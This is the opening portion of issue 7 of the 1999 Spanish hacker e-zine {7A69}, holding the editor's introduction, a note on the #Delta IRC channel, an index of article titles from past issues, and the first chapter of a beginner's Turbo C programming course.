
                                ÉÍÍÍÍÍÍÍÍÍÍÍÍ»
           ---------------------º  22-12-99  º-------------------
                                ÈÍÍÍÍÍÍÍÍÍÍÍÍ¼
           ------------------------------------------------------
           ²²²²²²²²²²²°      ²²²²°            ²²²°        ²²²²°     
                    ²²°     ²²° ²²°         ²²°         ²²°   ²²°
                   ²²°     ²²°   ²²°       ²²°         ²²°    ²²°
                  ²²°      ²²°   ²²°       ²²²²²°       ²²°   ²²°
                 ²²°      ²²²²²²²²²²°     ²²°   ²²°       ²²²²²°            
                ²²°       ²²°     ²²°     ²²°    ²²°         ²²°
               ²²°       ²²°       ²²°    ²²°   ²²°         ²²°
              ²²°        ²²°       ²²°     ²²²²²°        ²²²°               
           ------------------------------------------------------
                           E-ZINE PARA GENTE LIBRE    
           ------------------------------------------------------
           [ Num 7  - A¤o I ]                    [ editor: Ripe ]





                     -Distribuidores oficiales de 7A69-

             http://www.geocities.com/fashionavenue/Stage/1500





                               -E-Mail oficial-

                            7a69ezine@mixmail.com





                       -Colaboradores en este numero-

                                  AiNaKeR (?@?)

                                   IReick (?@?)
                           
                                    Ripe (ripe@mixmail.com)

                                  



                              -Recomendaciones-

       Usar el EDIT de MS-DOS o el JED de linux para leer este E-Zine





           ------------------------------------------------------



                         "­­I'm too hax0r for you!!"
           
  
            <Ripe: Esta frase tiene copiright warro  por [LsD]-MT,
                   ya sabeis, nada de copiar que os veo venir :)>
      
      
#############################################################################
# NOTA: Ninguno de los colaboradores en este e-zine se responsabiliza del   #
#       mal use que el lector pueda hacer de la informacion que aqui se     #
#       presenta, ya que esta esta expuesta con fines unicamente            #
#       informativos. Asi que ya sabes TODO LO QUE HAGAS ES RESPONSABILIDAD #
#       TUYA, NO NUESTRA.                                                   #
#############################################################################





ÉÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍËÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍËÍÍÍÍÍÍÍÍÍÍÍÍÍËÍÍÍÍÍÍÍÍÍÍÍÍÍ»
º         * ARTICULO *        º     * TEMA *    º  * NIVEL *  º  * AUTOR *  º
ºÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄºÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄºÄÄÄÄÄÄÄÄÄÄÄÄÄºÄÄÄÄÄÄÄÄÄÄÄÄÄº            
º1.- Presentacion*            º                 º             º   Editor    º
ºÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄºÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄºÄÄÄÄÄÄÄÄÄÄÄÄÄºÄÄÄÄÄÄÄÄÄÄÄÄÄº           
º2.- {7A69} y #Delta          º    Aclaracion   º             º    Ripe     º
ºÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄºÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄºÄÄÄÄÄÄÄÄÄÄÄÄÄºÄÄÄÄÄÄÄÄÄÄÄÄÄº          
º3.- Indice {7A69}  [1-7]     º     {7A69}      º             º   Editor    º
ºÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄºÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄºÄÄÄÄÄÄÄÄÄÄÄÄÄºÄÄÄÄÄÄÄÄÄÄÄÄÄº
º4.- Curso de C y C++         º  Programacion   º    Bajo     º   IReick    º
ºÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄºÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄºÄÄÄÄÄÄÄÄÄÄÄÄÄºÄÄÄÄÄÄÄÄÄÄÄÄÄº            
º5.- Curso de UNIX III        º     Hacking     º    Bajo     º    Ripe     º
ºÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄºÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄºÄÄÄÄÄÄÄÄÄÄÄÄÄºÄÄÄÄÄÄÄÄÄÄÄÄÄº            
º6.- Ni¤os malos              º     Opinion     º             º   Anonimo   º
ºÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄºÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄºÄÄÄÄÄÄÄÄÄÄÄÄÄºÄÄÄÄÄÄÄÄÄÄÄÄÄº
º7.- Charlando con GriYo      º    Entrevista   º             º    Ripe     º
ºÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄºÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄºÄÄÄÄÄÄÄÄÄÄÄÄÄºÄÄÄÄÄÄÄÄÄÄÄÄÄº
º8.- Entra¤as del computador  º     Hacking     º Medio-Bajo  º    Ripe     º
ºÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄºÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄºÄÄÄÄÄÄÄÄÄÄÄÄÄºÄÄÄÄÄÄÄÄÄÄÄÄÄº
º9.- Curso de ASM *           º  Programacion   º    Medio    º             º
ºÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄºÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄºÄÄÄÄÄÄÄÄÄÄÄÄÄºÄÄÄÄÄÄÄÄÄÄÄÄÄº
º10.- Un paseo por el pasado  ºHacking/Phreakingº    Bajo     º   Varios    º
ºÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄºÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄºÄÄÄÄÄÄÄÄÄÄÄÄÄºÄÄÄÄÄÄÄÄÄÄÄÄÄº
º11.- Proyectos               º    El futuro    º             º   Editor    º
ºÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄºÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄºÄÄÄÄÄÄÄÄÄÄÄÄÄºÄÄÄÄÄÄÄÄÄÄÄÄÄº
º12.- Noticias / Curiosidades*º   Actualidad    º             º    Ripe     º
ºÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄºÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄºÄÄÄÄÄÄÄÄÄÄÄÄÄºÄÄÄÄÄÄÄÄÄÄÄÄÄº
º13.- La voz del lector       º     Mailing     º             º   Editor    º
ºÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄºÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄºÄÄÄÄÄÄÄÄÄÄÄÄÄºÄÄÄÄÄÄÄÄÄÄÄÄÄº
º14.- Despedida               º  Un numero mas  º             º   Editor    º
ÈÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÊÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÊÍÍÍÍÍÍÍÍÍÍÍÍÍÊÍÍÍÍÍÍÍÍÍÍÍÍÍ¼






ÉÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍËÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍËÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ»
º         * ARTICULO *         º      * TEMA *      º       * NIVEL *       º
ºÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄºÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄºÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄº
º1.- Presentacion              º                    º                       º     
ÈÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÊÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÊÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ¼
                                                                   [ Editor ]

Hola lector. Ya volvemos a estar aqui nuevamente con nuestro E-Zine favorito
(je je je), {7A69} que llega a su septimo numero (si, aun que parezaca
mentira SEP-TI-MO). Y llega, como no, para que podais pasar el tiempo libre
que proporcionan las fiestas navide¤as leyendo algo (aun que tambien podeis
obtar por algun libro de SANTILLANA). Aun que bien he de decir que esto no
hubiera  sido posible sin TI que estas al otro lado ;)

Bueno, como habeis ido notando el nivel de {7A69} ha subido progresibamente,
de manera que cualquier persona puede adquirir ciertos conocimientos sobre
hack y virii (y esperamos que en un futuro tambien algo de crack y phreak,
todo se vera), asi que si estas lellendo esto y algo te parece complicado
leete antes los numeros anteriores, ya que quiza te ayuden a comprender lo
que aqui se cuenta.

Bueno, nada mas que decir... unicamente un saludo a los colaboradores, ya que
gracias a todos ellos hemos conseguido subir el liston que habiamos marcado
con {7A69} #6. En este numero 7 podreis encontrar cursos de programacion,
entrevistas, una guia rapida que te ira bien a la hora de buscar un articulo
en concreto publicado en {7A69} y muchas cosas mas (Ya sabes, toca leer :P).

Me gustaria dar las gracias todos aquellos que leeis este E-Zine, y en
especial a aquellos que se dedican a escribir un mail de felicitacion, para
dar animos, para alguna recomendacion o peticion, y para hacenos llegar algun
articulo (de estos hay pocos :( Para no decir ninguno).

NOTA: Ahora los E-Mails que vayan a ir destinados al E-Zine deberan ser
      mandados a 7a69ezine@mixmail.com (que si no se me llena el buzon :P),
      asi pues se aceptaran criticas, recomendaciones, propuestas, articulos
      (y lo que quieras xD).

Y recuerda que buscamos en especial articulos dedicados al phreak, un tema
que no se a tocado casi nada en {7A69} y que me gustaria hacerlo.

Bueno, nada mas que decir (me enroyo demasiado)....





ÉÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍËÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍËÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ»
º         * ARTICULO *         º      * TEMA *      º       * NIVEL *       º
ºÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄºÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄºÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄº
º2.- {7A69} y #Delta           º     Aclaracion     º                       º     
ÈÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÊÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÊÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ¼
                                                                     [ Ripe ]
                                               
Con este articulo voy a intentar aclarar algunas cosas, ya que parece que
muchas personas estan confundiendo {7A69} con #Delta. He de dicir varias
cosas:

1.- Dejando de lado lo contado en numeros anteriores de este E-zine, dire que
    que #Delta NO es un grupo de hack, si no un lugar de reunion entre todas
    aquellas personas que realmente estan intresadas en el tema de la
    seguridad informatica. #Delta es un canal privado por lo que no
    cualquiera tiene acceso, lo tienen unica y exclusivamente aquellas
    personas que se mueren (es un decir) por aprender y experimentar.

    ¨Con que proposito se ha creado #Delta? Pues la verdad es que #Delta
    pretendia ser en un principio un Grupo de seguridad informatica, pero
    en una reunios que se hizo se decidio convertir #Delta en un grupo
    abierto (y al mismo tiempo cerrado). ¨Por que? La verdad es que muchos
    estamos ya hartos de esa gente que entra en canales como #hack, #hacker,
    #hacking, etc y se dedica a preguntar paridas y/o hablar de otros temas
    que en ningun momento tienen nada que ver con el hack. En #Delta se habla
    unica y exclusivamente de seguridad informatica, y he de decir que en
    este poco tiempo que llevamos con esta idea la cosa ha funcionado
    bastante bien y se ha tratado bastante el tema.
    
2.- La segunda cosa es decir que de momento {7A69} no es ningun proyecto de
    #Delta (aun que puedas encontrar muchos de sus colavoradores en dicho
    canal), sinembargo es posible que en un futuro {7A69} se convierta en uno
    de los proyectos de #Delta.

Bueno, aclarados ya estos dos temas he de hacer un llamamiento a todos los
integrantes de #Delta para que entre todos podamos realizar la web del canal
(si no recuerdo mal corria por ahi una version beta de la web, ¨donde estara
ahora? :P).

Saludos a la gente del CANAL


     ###   ###   Ú²²²²²¿     Ú²²²²²²²²¿ Ú²²     Ú²²²²²²²²¿   Ú²²²¿
   ############# ³²²   ²²¿   ³²²ÄÄÄÄÄÄÙ ³²²     ÀÄÄ¿²²ÚÄÄÙ  Ú²² ²²¿
   ############# ³²²    ²²¿  ³²²        ³²²        ³²²³    Ú²²   ²²¿
     ###   ###   ³²²     ²²¿ ³²²²²²²²²¿ ³²²        ³²²³   Ú²²     ²²¿
     ###   ###   ³²²    ²²ÚÙ ³²²ÄÄÄÄÄÄÙ ³²²        ³²²³   ³²²²²²²²²²³
   ############# ³²²   ²²ÚÙ  ³²²        ³²²        ³²²³  Ú²²ÚÄÄÄÄÄ¿²²¿
   ############# ³²²²²²ÚÄÙ   ³²²²²²²²²¿ ³²²²²²²²²¿ ³²²³  ³²²³     ³²²³
     ###   ###   ÀÄÄÄÄÄÙ     ÀÄÄÄÄÄÄÄÄÙ ÀÄÄÄÄÄÄÄÄÙ ÀÄÄÙ  ÀÄÄÙ     ÀÄÄÙ





ÉÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍËÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍËÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ»
º         * ARTICULO *         º      * TEMA *      º       * NIVEL *       º
ºÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄºÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄºÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄº
º3.- Indice {7A69}  [1-7]      º       {7A69}       º                       º
ÈÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÊÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÊÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ¼
                                                                   [ Editor ]

Este es ya nuestro septimo numero (­Bieeeeeen!), lo que indica que esto mas
o menos funciona. Debido a la numerosa cantidad de numeros de 7A69 (vaya
juego de palabras :P) he decidido dedicar un articulo al que puedes acudir si
quieres ver un articulo en concreto y no recuerdas en que numero estaba.

Bueno. Preparados... Listos... ­Ya! :)




  /=======================================================================\
 /--------------------------{ R|p3Hack num 1 }-----------------------------\
/==============================================================[ 09-04-99 ]=\
    .-------------------------.     .---------.                             
   {  1.-Presentacion          \---/           ï------------.    .-------.  
    `-                         /---\            |            }--<  Ripe   >   
      `-----------------------`     `-----------------------ï    `-------ï  
    .-------------------------.     .---------.                             
   {  2.-El grupo TNT          \---/ Grupo de  ï------------.    .-------.  
    `-                         /---\   Hack     |            }--<  Ripe   >
      `-----------------------`     `-----------------------ï    `-------ï  
    .-------------------------.     .---------.                             
   {  3.-El codigo estico del  \---/  Hacking  ï------------.    .-------.  
    `-   hacker                /---\            |  Muy Bajo  }--<  Ripe   >
      `-----------------------`     `-----------------------ï    `-------ï  
    .-------------------------.     .---------.                             
   {  4.-Diccionario de Ayuda  \---/  Hacking  ï------------.    .-------.  
    `-                         /---\            |  Muy Bajo  }--<  Ripe   >
      `-----------------------`     `-----------------------ï    `-------ï  
    .-------------------------.     .---------.                             
   {  5.-Despedida             \---/           ï------------.    .-------.  
    `-                         /---\            |            }--<  Ripe   >
      `-----------------------`     `-----------------------ï    `-------ï  




  /=======================================================================\
 /--------------------------{ R|p3Hack num 2 }-----------------------------\
/==============================================================[ 07-05-99 ]=\
    .-------------------------.     .---------.                             
   {  1.-Presentacion          \---/           ï------------.    .-------.  
    `-                         /---\            |            }--<  Ripe   >   
      `-----------------------`     `-----------------------ï    `-------ï  
    .-------------------------.     .---------.                             
   {  2.-El grupo TNT          \---/ Grupo de  ï------------.    .-------.  
    `-                         /---\   Hack     |            }--<  Ripe   >
      `-----------------------`     `-----------------------ï    `-------ï 
    .-------------------------.     .---------.                             
   {  3.-Diccionario de        \---/  Hacking  ï------------.    .-------.  
    `-   Ayuda II              /---\            |  Muy Bajo  }--<  Ripe   >
      `-----------------------`     `-----------------------ï    `-------ï  
    .-------------------------.     .---------.                             
   {  4.-¨Por donde empezar?   \---/  Hacking  ï------------.    .-------.  
    `-                         /---\            |  Muy Bajo  }--<  Ripe   >
      `-----------------------`     `-----------------------ï    `-------ï  
    .-------------------------.     .---------.                             
   {  5.-Informe del virus     \---/  Viruses  ï------------.    .-------. 
    `-   MELISSA               /---\            |  Muy Bajo  }--<  Ripe   >
      `-----------------------`     `-----------------------ï    `-------ï  
    .-------------------------.     .---------.                             
   {  6.-Despedida             \---/           ï------------.    .-------.  
    `-                         /---\            |            }--<  Ripe   >
      `-----------------------`     `-----------------------ï    `-------ï  




  /=======================================================================\
 /--------------------------{ R|p3Hack num 3 }-----------------------------\
/==============================================================[ 22-05-99 ]=\
    .-------------------------.     .---------.                             
   {  1.-Presentacion          \---/           ï------------.    .-------.  
    `-                         /---\            |            }--<  Ripe   >   
      `-----------------------`     `-----------------------ï    `-------ï  
    .-------------------------.     .---------.                             
   {  2.-El grupo TNT          \---/ Grupo de  ï------------.    .-------.  
    `-                         /---\   Hack     |            }--<  Ripe   >
      `-----------------------`     `-----------------------ï    `-------ï  
    .-------------------------.     .---------.                             
   {  3.-Introduccion a la     \---/  Hacking  ï------------.    .-------.  
    `-   Ingenieria Social     /---\            |  Muy Bajo  }--<  Ripe   >
      `-----------------------`     `-----------------------ï    `-------ï  
    .-------------------------.     .---------.                             
   {  4.-Introduccion a los    \---/  Viruses  ï------------.    .-------.  
    `-   virus                 /---\            |  Muy Bajo  }--< |CoDeX| >
      `-----------------------`     `-----------------------ï    `-------ï 
    .-------------------------.     .---------.                             
   {  5.-Introduccion al UNIX  \---/  Hacking  ï------------.    .-------.  
    `-                         /---\            |    Bajo    }--<  Ripe   >
     `-----------------------`     `-----------------------ï    `-------ï  
    .-------------------------.     .---------.                            
   {  6.-Despedida             \---/           ï------------.    .-------.  
    `-                         /---\            |            }--<  Ripe   >
      `-----------------------`     `-----------------------ï    `-------ï  
     



  /=======================================================================\
 /------------------------------{ 7A69 num 4 }-----------------------------\
/==============================================================[ 25-07-99 ]=\
    .-------------------------.     .---------.                             
   {  1.-Presentacion          \---/           ï------------.    .-------.  
    `-                         /---\            |            }--<  Ripe   >    
      `-----------------------`     `-----------------------ï    `-------ï  
    .-------------------------.     .---------.                             
   {  2.-Delta                 \---/ Grupo de  ï------------.    .-------.  
    `-                         /---\   Hack     |            }--<  Ripe   >
      `-----------------------`     `-----------------------ï    `-------ï  
    .-------------------------.     .---------.                             
   {  3.-Introduccion a la     \---/  Hacking  ï------------.    .-------.  
    `-   Ingenieria Social II  /---\            |  Muy Bajo  }--<  Ripe   >
      `-----------------------`     `-----------------------ï    `-------ï  
    .-------------------------.     .---------.                             
   {  4.-Introduccion a los    \---/  Viruses  ï------------.    .-------.  
    `-   virus II              /---\            |  Muy Bajo  }--< |CoDeX| >
      `-----------------------`     `-----------------------ï    `-------ï  
    .-------------------------.     .---------.                             
   {  5.-Introduccion al       \---/  Hacking  ï------------.    .-------.  
    `-   UNIX II               /---\            |    Bajo    }--<  Ripe   >
      `-----------------------`     `-----------------------ï    `-------ï  
    .-------------------------.     .---------.                             
   {  6.-Introduccion al       \---/   Redes   ï------------.    .-------.  
    `-   TCP/IP                /---\            |   Medio    }--< |CoDeX| >
      `-----------------------`     `-----------------------ï    `-------ï  
    .-------------------------.     .---------.                             
   {  7.-Despedida             \---/           ï------------.    .-------.  
    `-                         /---\            |            }--<  Ripe   >
      `-----------------------`     `-----------------------ï    `-------ï  




  /=======================================================================\
 /------------------------------{ 7A69 num 5 }-----------------------------\
/==============================================================[ 25-09-99 ]=\
    .-------------------------.     .---------.                             
   {  1.-Presentacion          \---/           ï------------.    .-------.  
    `-                         /---\            |            }--<  Ripe   >    
      `-----------------------`     `-----------------------ï    `-------ï  
    .-------------------------.     .---------.                             
   {  2.-Los intocables        \---/ Grupo de  ï------------.    .-------.  
    `-                         /---\   Hack     |            }--<  Ripe   >
      `-----------------------`     `-----------------------ï    `-------ï  
    .-------------------------.     .---------.                             
   {  3.-Otras tecnicas de     \---/  Hacking  ï------------.    .-------.  
    `-   ingenieria social     /---\            |  Muy Bajo  }--<  Ripe   >
      `-----------------------`     `-----------------------ï    `-------ï  
    .-------------------------.     .---------.                             
   {  4.-Introduccion a los    \---/  Viruses  ï------------.    .-------.  
    `-   virus III             /---\            |  Muy Bajo  }--< |CoDeX| >
      `-----------------------`     `-----------------------ï    `-------ï  
    .-------------------------.     .---------.                             
   {  5.-Curso de UNIX         \---/  Hacking  ï------------.    .-------.  
    `-                         /---\            |    Bajo    }--<  Ripe   >
      `-----------------------`     `-----------------------ï    `-------ï  
    .-------------------------.     .---------.                             
   {  6.-Introduccion al       \---/   Redes   ï------------.    .-------.  
    `-   TCP/IP II             /---\            |   Medio    }--< |CoDeX| >
      `-----------------------`     `-----------------------ï    `-------ï  
    .-------------------------.     .---------.                             
   {  7.-Criptografia          \---/   Datos   ï------------.    .-------.  
    `-                         /---\            |   Medio    }--< |CoDeX| >
      `-----------------------`     `-----------------------ï    `-------ï  
    .-------------------------.     .---------.                             
   {  8.-Despedida             \---/           ï------------.    .-------.  
    `-                         /---\            |            }--<  Ripe   >
      `-----------------------`     `-----------------------ï    `-------ï  



  /=======================================================================\
 /------------------------------{ 7A69 num 6 }-----------------------------\
/==============================================================[ XX-XX-XX ]=\
    .-------------------------.     .---------.                             
   {  1.-Presentacion          \---/           ï------------.    .-------.  
    `-                         /---\            |            }--<  Ripe   >    
      `-----------------------`     `-----------------------ï    `-------ï  
     .-------------------------.     .---------.                             
   {  2.-#hacker_novatos       \---/ Canal de  ï------------.    .-------.  
    `-                         /---\    IRC     |            }--<  Ripe   >
      `-----------------------`     `-----------------------ï    `-------ï  
    .-------------------------.     .---------.                             
   {  3.-Comandos basicos del  \---/  Hacking  ï------------.    .-------. 
    `-   FTP                   /---\            |  Muy Bajo  }--<  Dan^^  >
      `-----------------------`     `-----------------------ï    `-------ï  
    .-------------------------.     .---------.                             
   {  4.-La historia de los    \---/  Viruses  ï------------.    .-------.  
    `-   virus                 /---\            |  Muy Bajo  }--<  Ripe   >
      `-----------------------`     `-----------------------ï    `-------ï  
    .-------------------------.     .---------.                             
   {  5.-Curso de UNIX I       \---/  Hacking  ï------------.    .-------.  
    `-                         /---\            |    Bajo    }--<  Ripe   >
      `-----------------------`     `-----------------------ï    `-------ï  
    .-------------------------.     .---------.                             
   {  6.-Introduccion al       \---/   Redes   ï------------.    .-------.  
    `-   TCP/IP III            /---\            |   Medio    }--< |CoDeX| >
      `-----------------------`     `-----------------------ï    `-------ï  
    .-------------------------.     .---------.                            
   {  7.-Criptografia II       \---/   Datos   ï------------.    .-------.  
    `-                         /---\            |   Medio    }--< |CoDeX| >
      `-----------------------`     `-----------------------ï    `-------ï  
    .-------------------------.     .---------.                             
   {  8.-­No dejes huellas!    \---/  Hacking  ï------------.    .-------.  
    `-                         /---\            |    Bajo    }--<  IReik  >
      `-----------------------`     `-----------------------ï    `-------ï  
    .-------------------------.     .---------.                             
   {  9.-Tecnicas de hacking   \---/  Hacking  ï------------.    .-------.  
    `-   (Sniffing y spoofing) /---\            |    Bajo    }--<  Ripe   >
      `-----------------------`     `-----------------------ï    `-------ï  
    .-------------------------.     .---------.                             
   {  10.-Proyectos            \---/ El futuro ï------------.    .-------.  
    `-                         /---\            |            }--<  Ripe   >
      `-----------------------`     `-----------------------ï    `-------ï  
    .-------------------------.     .---------.                             
   {  11.-Despedida            \---/           ï------------.    .-------.  
    `-                         /---\            |            }--<  Ripe   >
      `-----------------------`     `-----------------------ï    `-------ï  




  /=======================================================================\
 /------------------------------{ 7A69 num 7 }-----------------------------\
/==============================================================[ XX-XX-XX ]=\
                                                                           
            ­­JODER TIO!! MIRA ARRIBA, ES QUE ERES PEREZOSO ;)             






Bueno ahora ya teneis una guia rapida de consulta para los primeros 6 numeros
(y si os lo currais un poco tambien para el setptimo ;P), que os ira bien
para buscar un articulo en concreto :)

NOTA: ­­¨¨Que pasa??!! Era una noche que estaba aburrido y me dio por hacer
      esto.

             



ÉÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍËÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍËÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ»
º         * ARTICULO *         º      * TEMA *      º       * NIVEL *       º
ºÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄºÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄºÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄº
º4.- Curso de C y C++          º    Programacion    º         Bajo          º
ÈÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÊÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÊÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ¼
                                                                    [ IReik ]

Bueno, antes de empezar a soltar parrafadas, me presento, soy IReick y vais a
tenerme que aguantar durante mucho tiempo en este e-zine porque este es solo
el primer capitulo del primero de los cursos sobre programacion que vamos a
publicar en el e-zine (si Ripe lo permite ;P ).

                        <Ripe: ­­Pues claro machote!!
                               Y gracias por colaborar>

Para continuar dire que durante este curso (y los que vendran) no dare nada
por supuesto, es decir iremos desde el principio al final y poniendo ejemplos
de todo para que todos os entereis bien de todo.

Bien, pues vamos a presentar este primero curso, lenguaje C, dire que el
compilador que utilizaremos para el cuso sera el turbo C para MSDOS, ¨porque
este compilador?, por nada en especial, simplemente porque es con el que yo
aprendi y porque me parece que es bastante facil adquirirlo (aunque dire que
tiene bastantes fallos, ya los iremos viendo ;o) .

Bien este primer curso lo dividiremos en 7 capitulos, en los cuales veremos
desde una intrduccion y el funcionamento del compilador (ya he dicho antes
que no dare nada por supuesto) hasta el uso de estructuras y librerias.

Bueno pues ya me dejo de rollos y paso con el primer capitulo




                        CAPITULO 1 - PRIMEROS PASOS



        1.1-Introduccion


Bueno, primero una definicion algo tecnica ¨que co¤o es el lenguaje C? Pues
bien el lenguaje C es un lenguaje de programacion interactiva aplicable tanto
a ordenadores personales como microordenadores y nosotros vamos  a intentar
enterarnos de toda la tecnica de este maravilloso lenguaje.

Mu bien, pues vamos con el principio, la instalacion de turbo C, turbo C no
se instala, sino que en el diskette de sistema tendremos los siguientes
archivos: tc.exe, cos.obj, emu.lib, fp87.lib, maths.lib, cs.lib y el resto
que son de extension *.h tos.

Ahora es cuando salta el primer espabilao y me dice que tos no caben en un
diskette, mu bien, pues entonces la respuesta es usa dos discos, uno de
sistema y otro de trabajo

    -DE SISTEMA : metemos TC.EXE y en un subdirectorio que creareis con
                  nombre INCLUDE enchufais los de extension *.h

    -DE TRABAJO: creamos un subdirectorio (en el HD) LIB y hala enchufais los
                 demas ficheros.

NOTA: Os lo reparto de esta manera por que asi es como me lo ense¤aron a mi.



        1.2 Vamos a empesar de una puta vez


Voy a suponer que todos sabeis iniciar una sesion de tc (supongo que eso si
lo puedo suponer, meteis el diskete de sistema y tecleais TC, veis que facil
;o)

Como esta dividido Turbo C, pues en las siguientes partes: MENU PRINCIPAL
(con toas las opciones), VENTANA DE EDICION (onde creamos programas), VENTANA
DE MENSAJES (esta es la ventana que mas odiareis porque es donde os saldran
los errores de vuestro programa), por ultimo abajito de todo teneis algunas
teclas de funcion.

Mu bien dejo dicho que para ir de una parte a otra lo hacemos pulsando F6 y
para ir directos al menu principal pos F10.
   


        1.3 El menu principal


Mu bien, lo primero que hemos de saber del menu principal de turbo c es que
menos EDIT y RUN, las demas opciones despliegan menus.

Despues hemos de saber que en Turbo C hay dos tipos de opciones (aqui es
cuando todos pensais que esto es una parida, pero joder demos tambien la
oportunidad de aprender a los menos avispados ;o) :COMANDOS y TOOGLES

Mu bien, ahora una peque¤a vista a las diferentes opciones del menu
principal:

    -File: desde aqui jugamos con los ficheros, directorios y cerramos el
           turbo c.

    -Edit: le damos y pasamos a la ventana de edicion pa crear programas. 

    -Run: Compila y ejecuta.

    -Compile: Compila y combierte en objeto.

    -Project: Pa manejar la proyeccion y los ficheros que hay en el programa
              (los proyectos los crearemos en las ultimas lecciones, asi que
              paciencia ;o).

    -Opcions: Pos opciones que iremos viendo.



        1.4 La ventana de edicion


Bien, en esta ventana, tenemos un espacio en blanco pa escribir y una linea
de estado con datos del fichero y por onde anda el cursor.

